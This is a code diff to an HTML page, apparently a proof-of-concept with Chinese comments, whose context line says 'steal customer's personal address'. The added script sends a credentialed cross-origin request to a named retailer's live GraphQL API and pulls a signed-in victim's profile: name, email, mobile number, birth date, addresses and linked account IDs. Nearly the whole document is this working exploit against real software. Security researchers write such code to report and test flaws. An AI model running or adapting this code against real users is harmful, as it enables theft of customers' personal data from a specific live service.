@@ -22,20 +22,8 @@ steal customer's personal address
 </div>
 </br>
 <script>
+const targetpii = 'https://cnbs-api.underarmour.cn/graphql/?opname=getUserInfo'; 
 
-     var xmlhttp1 = new XMLHttpRequest()
-     xmlhttp1.onreadystatechange=function()
-	{
-		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
-		{
-			document.getElementById("customerpii").innerHTML = xmlhttp1.responseText;
-			console.log("Success");
-		}
-	}
-    	
-	xmlhttp1.open("GET","https://cnbs-api.underarmour.cn/graphql/?opname=queryAddressList",true);
-	xmlhttp1.withCredentials = true;
-	xmlhttp1.send();
 	
     // 目标请求地址（需替换为实际接口URL）
 const targetAddress = 'https://cnbs-api.underarmour.cn/graphql/?opname=queryAddressList'; 
@@ -97,6 +85,97 @@ fragment addressInfo on MemberShippingAddress {
 }`
   })
 };
+
+const requestConfig = {
+  method: 'POST',
+  mode: 'cors',                  // 启用CORS跨域模式
+  credentials: 'include',        // 携带Cookies（关键配置）
+  headers: {
+    'Content-Type': 'application/json',  // JSON数据格式声明
+    // 可选：添加其他必要请求头（如认证Token）
+    // 'Authorization': 'Bearer your-auth-token'
+  },
+  body: JSON.stringify({
+    "operationName": "getUserInfo",
+    "variables": {},
+    "query": `query getUserInfo {
+  userInfo: getUserInfoUA {
+    vip
+    isPushInformation
+    isUpdateBirthday
+    gender
+    memberCode
+    lastName
+    firstName
+    email
+    mobile
+    birthDate
+    emailVerified
+    mobileVerified
+    registerDate
+    source
+    acceptMarketingFlag
+    taxExemptFlag
+    hasBoundSportWeapp
+    passwordSet
+    wechatImg
+    shippingAddress {
+      addressCode
+      defaultAddress
+      countryCode
+      countryName
+      stateCode
+      stateName
+      cityCode
+      cityName
+      __typename
+    }
+    thirdIds {
+      thirdChannel
+      thirdId
+      __typename
+    }
+    emailMessage
+    whatsAppMessage
+    whatsApp
+    isPerfectInformation
+    customAttributeList {
+      attributeKey
+      attributeName
+      attributeValue
+      attributeValueType
+      __typename
+    }
+    rank {
+      rankName
+      rankLevel
+      __typename
+    }
+    protocolFlag
+    __typename
+  }
+}`
+  })
+};
+ 
+// 发送请求并处理响应
+fetch(targetpii, requestConfig)
+  .then(response => {
+    // 检查HTTP响应状态
+    if (!response.ok) {
+      throw new Error(`请求失败: ${response.status} ${response.statusText}`);
+    }
+    // 解析JSON响应（根据接口实际返回格式调整）
+    return response.json();
+  })
+  .then(data => {
+    console.log('用户信息获取成功:', data);
+    document.getElementById("customerpii").innerHTML = data;
+  })
+  .catch(error => {
+    console.error('请求异常:', error);
+    // 错误处理（如网络错误、CORS限制、服务器错误等）
+  });
 
 // 发送请求并处理响应
 fetch(targetAddress, requestOptions)
